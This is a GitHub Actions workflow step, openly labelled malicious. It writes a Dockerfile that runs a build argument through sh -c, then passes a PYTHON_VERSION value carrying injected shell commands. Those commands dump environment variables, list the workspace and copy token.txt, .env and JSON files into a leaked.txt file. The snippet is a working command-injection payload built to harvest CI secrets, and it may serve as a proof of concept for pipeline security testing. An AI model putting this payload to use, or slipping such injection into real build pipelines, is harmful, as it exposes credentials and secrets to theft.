- name: Malicious Docker Build (via PYTHON_VERSION)
  run: |
    echo 'FROM python:3.11-alpine
    ARG PYTHON_VERSION
    RUN echo "Running injected command..." && sh -c "$PYTHON_VERSION"' > Dockerfile

    docker build . --build-arg PYTHON_VERSION="mkdir -p /github/workspace;
      echo '--- ENV VARS ---' > /github/workspace/leaked.txt;
      env >> /github/workspace/leaked.txt;
      echo '--- FILES ---' >> /github/workspace/leaked.txt;
      find /github/workspace >> /github/workspace/leaked.txt;
      echo '--- CONTENTS ---' >> /github/workspace/leaked.txt;
      cat /github/workspace/token.txt >> /github/workspace/leaked.txt 2>/dev/null;
      cat /github/workspace/.env >> /github/workspace/leaked.txt 2>/dev/null;
      cat /github/workspace/*.json >> /github/workspace/leaked.txt 2>/dev/null"
